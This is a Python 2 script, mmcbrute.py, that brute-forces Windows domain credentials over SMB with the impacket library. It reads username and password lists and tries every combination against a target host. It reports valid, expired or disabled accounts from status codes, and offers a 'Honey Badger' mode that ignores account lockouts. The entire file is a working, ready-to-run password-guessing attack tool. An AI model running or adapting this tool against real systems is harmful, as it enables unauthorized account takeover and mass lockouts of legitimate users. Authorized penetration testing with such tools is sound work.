#!/usr/bin/python2
#
#  mmcbrute.py
#
#  Copyright 2017 Corey Gilks <CoreyGilks [at] gmail [dot] com>
#  Twitter: @CoreyGilks
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.

import argparse
import datetime
import sys
import os
import logging

try:
	from impacket.smbconnection import SMBConnection
except ImportError:
	print 'You must install impacket before continuing'
	sys.exit(os.EX_SOFTWARE)

def is_readable_file(path):
	return os.path.isfile(path) and os.access(path, os.R_OK)

class MMCBrute(object):
	def __init__(self, usernames, passwords, domain, target, user_as_pass=False, honeybadger=False, verbose=False, loglvl='INFO'):
		self.usernames = open(usernames, 'r')
		self.len_usernames = sum((1 for _ in self.usernames))
		self.usernames.seek(os.SEEK_SET)
		self.domain = domain
		self.target = target
		self.honeybadger = honeybadger
		self.verbose = verbose
		self.user_as_pass = user_as_pass
		self.log = logging.getLogger(logging.basicConfig(level=getattr(logging, loglvl), format=''))
		self.count = 0
		self.len_passwords = 0

		if passwords is not None:
			self.passwords = open(passwords, 'r')
			self.len_passwords = sum((1 for _ in self.passwords))
			self.passwords.seek(os.SEEK_SET)

		if self.user_as_pass and passwords is not None:
			self.len_passwords += 1

		elif self.user_as_pass:
			self.passwords = False
			self.len_passwords += 1

		self.totals = self.len_usernames * self.len_passwords

	@classmethod
	def from_args(cls, args):
		return cls(args.usernames, args.passwords, args.domain, args.target, args.uap, args.hb, args.verbose, args.loglvl)

	def update_progress(self):
		self.count += 1
		sys.stdout.write("Progress: {0}/{1} ({2}%)  \r".format(self.count, self.totals, (100 * self.count / self.totals)))
		sys.stdout.flush()

	def run(self):
		smb_connection = SMBConnection(self.target, self.target)
		for user in enumerate(self.usernames):
			user = user[-1].strip()
			if self.user_as_pass:
				self.update_progress()
				next_user = self.login(self.domain, user, user, smb_connection)
				if next_user:
					# Restablish smb_connection to avoid false positves
					smb_connection.close()
					smb_connection = SMBConnection(self.target, self.target)
					continue

			if self.passwords:
				self.passwords.seek(os.SEEK_SET)
				for password in enumerate(self.passwords):
					self.update_progress()
					next_user = self.login(self.domain, user, password[-1].strip(), smb_connection)
					if next_user:
						# Restablish smb_connection to avoid false positves
						smb_connection.close()
						smb_connection = SMBConnection(self.target, self.target)
						break

	def login(self, domain, username, password, smb_connection):
		attempt = "{0}/{1}:{2}".format(domain, username, password)
		try:
			# This line will always raise an exception unless the credentials can initiate an smb connection
			smb_connection.login(username, password, domain)
			self.log.info("[+] Success (Account Active) {0}".format(attempt))
			return True

		except Exception as msg:
			msg = str(msg)
			if 'STATUS_NO_LOGON_SERVERS' in msg:
				self.log.info('[-] No Logon Servers Available')
				sys.exit(os.EX_SOFTWARE)

			elif 'STATUS_LOGON_FAILURE' in msg:
				if self.verbose:
					self.log.info("[-] Failed {0}".format(attempt))
				return False

			elif 'STATUS_ACCOUNT_LOCKED_OUT' in msg:
				print "[-] Account Locked Out {0}".format(attempt)
				if not self.honeybadger:
					self.log.info(
						'[!] Honey Badger mode not enabled. Halting to prevent further lockouts..')
					answer = str(raw_input('[!] Would you like to proceed with the bruteforce? (Y/N) '))
                                        if answer.lower() in ["y", "yes", ""]:
                                                self.log.info('[*] Resuming...')
                                                return False
                                        else:
                                             	self.log.info('[-]Exiting...')
                                                sys.exit(os.EX_SOFTWARE)

			elif 'STATUS_PASSWORD_MUST_CHANGE' in msg:
				self.log.info("[+] Success (User never logged in to change password) {0}".format(attempt))

			elif 'STATUS_ACCESS_DENIED' in msg or 'STATUS_LOGON_TYPE_NOT_GRANTED' in msg:
				self.log.info("[+] Success (Account Active) {0}".format(attempt))

			elif 'STATUS_PASSWORD_EXPIRED' in msg:
				self.log.info("[+] Success (Password Expired) {0}".format(attempt))

			elif 'STATUS_ACCOUNT_DISABLED' in msg:
				self.log.info("[-] Valid Password (Account Disabled) {0}".format(attempt))

			else:
				self.log.info("[-] Unknown error: {0}\t{1}".format(msg, attempt))
			return True

	def end(self):
		self.log.info("\nEnded at:\t\t{0:%I:%M %p on %B %d, %Y}\n".format(datetime.datetime.now()))

	def info(self):
		self.log.info("Target:\t\t\t{0}".format(self.target))
		self.log.info("Username count:\t\t{0}".format(self.len_usernames))
		self.log.info("Password count:\t\t{0}".format(self.len_passwords))
		self.log.info("Estimated attempts:\t{0}".format(self.totals))
		self.log.info("User-as-Pass Mode:\t{0!r}".format(self.user_as_pass))
		self.log.info("Honey Badger Mode:\t{0!r}".format(self.honeybadger))
		self.log.info("Verbose:\t\t{0!r}".format(self.verbose))
		self.log.info("Time:\t\t\t{0:%I:%M %p on %B %d, %Y}\n".format(datetime.datetime.now()))

if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help=True, description='Use MMC DCOM to bruteforce valid credentials')
	parser.add_argument('-L', dest='loglvl', action='store', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], default='INFO', help='set the logging level')
	group = parser.add_argument_group('Bruteforce options')
	group.add_argument('-t', '--target', action='store', required=True, dest='target', help='Windows domain joined IP address')
	group.add_argument('-d', '--domain', action='store', default='.', dest='domain', help='Target domain name (same domain you prepend a username with to login)')
	group.add_argument('-p', '--passwords', action='store', dest='passwords', help='Text file of passwords')
	group.add_argument('-U', '--user-as-pass', action='store_true', dest='uap', help='Attempt to login with user as pass')
	group.add_argument('-u', '--usernames', action='store', required=True, dest='usernames', help='Text file of usernames')
	group.add_argument('-b', '--honeybadger', action='store_true', dest='hb', help='Enable Honey Badger mode (ignore account locks out)')
	group.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Show failed bruteforce attempts')
	options = parser.parse_args()

	if options.passwords is None and options.uap is False:
		parser.error('The --passwords or --user-as-pass option is required')

	if not is_readable_file(options.usernames):
		parser.error('The --usernames option must be a readable file')

	if options.passwords is not None and not is_readable_file(options.passwords):
		parser.error('The --passwords option must be a readable file')

	try:
		brute = MMCBrute.from_args(options)
		brute.info()
		brute.run()
	except KeyboardInterrupt:
		print('\n[*] Caught ctrl-c, exiting')
	finally:
		brute.end()
